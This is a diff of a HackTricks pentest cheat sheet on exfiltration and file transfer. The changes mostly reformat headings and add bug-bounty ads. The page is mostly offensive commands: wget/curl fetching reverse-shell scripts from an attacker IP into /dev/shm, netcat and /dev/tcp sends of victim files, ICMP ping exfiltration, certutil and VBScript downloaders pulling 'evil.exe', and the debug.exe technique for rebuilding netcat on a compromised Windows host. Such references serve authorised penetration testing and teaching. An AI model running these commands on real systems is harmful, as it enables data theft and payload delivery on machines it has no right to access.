@@ -1,41 +1,41 @@
-
+# Exfiltration
 
 <details>
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
 
+<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (6).png" alt="" data-size="original">\
+**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
 
-# Copy\&Paste Base64
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
-### Linux
+### Copy\&Paste Base64
+
+**Linux**
 
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
 
-### Windows
+**Windows**
 
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
 
-# HTTP
+### HTTP
 
-### Linux
+**Linux**
 
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
@@ -44,7 +44,7 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
 
-### Windows
+**Windows**
 
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
@@ -61,11 +61,13 @@ Start-BitsTransfer -Source $url -Destination $output
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
 
-## Upload files
+#### Upload files
 
 [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 
-## **HTTPS Server**
+[**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)****
+
+#### **HTTPS Server**
 
 ```python
 # from https://gist.github.com/dergachev/7028596
@@ -108,23 +110,23 @@ if __name__ == "__main__":
 ###
 ```
 
-# FTP
+### FTP
 
-## FTP server (python)
+#### FTP server (python)
 
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
 
-## FTP server (NodeJS)
+#### FTP server (NodeJS)
 
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 
-## FTP server (pure-ftp)
+#### FTP server (pure-ftp)
 
 ```bash
 apt-get update && apt-get install pure-ftp
@@ -144,7 +146,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-## **Windows** client
+#### **Windows** client
 
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
@@ -157,7 +159,12 @@ echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
 
-# SMB
+<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (6).png" alt="" data-size="original">\
+**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+
+{% embed url="https://go.intigriti.com/hacktricks" %}
+
+### SMB
 
 Kali as server
 
@@ -168,7 +175,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
 
-Or create a **smb **share **using samba**:
+Or create a smb share **using samba**:
 
 ```bash
 apt-get install samba
@@ -195,7 +202,7 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 
-# SCP
+### SCP
 
 The attacker has to have SSHd running.
 
@@ -203,23 +210,33 @@ The attacker has to have SSHd running.
 scp <username>@<Attacker_IP>:<directory>/<filename> 
 ```
 
-# NC
+### SSHFS
+
+If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
+
+```bash
+sudo apt-get install sshfs
+sudo mkdir /mnt/sshfs
+sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
+```
+
+### NC
 
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 
-# /dev/tcp
+### /dev/tcp
 
-## Download file from victim
+#### Download file from victim
 
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 
-## Upload file to victim
+#### Upload file to victim
 
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
@@ -230,10 +247,10 @@ cat <&6 > file.txt
 
 thanks to **@BinaryShadow\_**
 
-# **ICMP**
+### **ICMP**
 
 ```bash
-#In order to exfiltrate the content of a file via pings you can do:
+# To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
 #This will 4bytes per ping packet (you could probably increase this until 16)
 ```
@@ -250,17 +267,17 @@ def process_packet(pkt):
 sniff(iface="tun0", prn=process_packet)
 ```
 
-# **SMTP**
+### **SMTP**
 
-If you can send data to an SMTP server, you can create a SMTP to receive the data with python:
+If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
 
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 
-# TFTP
+### TFTP
 
-By default in XP and 2003 (in others it need to be explicitly added during installation)
+By default in XP and 2003 (in others it needs to be explicitly added during installation)
 
 In Kali, **start TFTP server**:
 
@@ -284,7 +301,7 @@ In **victim**, connect to the Kali server:
 tftp -i <KALI-IP> get nc.exe
 ```
 
-# PHP
+### PHP
 
 Download a file with a PHP oneliner:
 
@@ -292,13 +309,13 @@ Download a file with a PHP oneliner:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 
-# VBScript
+### VBScript
 
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
 
-### Victim
+**Victim**
 
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -332,9 +349,9 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 
-# Debug.exe
+### Debug.exe
 
-This is a crazy technique that works on Windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
+This is a crazy technique that works on Windows 32 bit machines. The idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
 
 `Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
 
@@ -342,7 +359,7 @@ This is a crazy technique that works on Windows 32 bit machines. Basically the i
 upx -9 nc.exe
 ```
 
-Now it only weights 29 kb. Perfect. So now let's disassemble it:
+Now it only weighs 29 kb. Perfect. So now let's disassemble it:
 
 ```
 wine exe2bat.exe nc.exe nc.txt
@@ -350,25 +367,23 @@ wine exe2bat.exe nc.exe nc.txt
 
 Now we just copy-paste the text into our windows-shell. And it will automatically create a file called nc.exe
 
-# DNS
+### DNS
 
-[https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
+* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (6).png" alt="" data-size="original">\
+**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
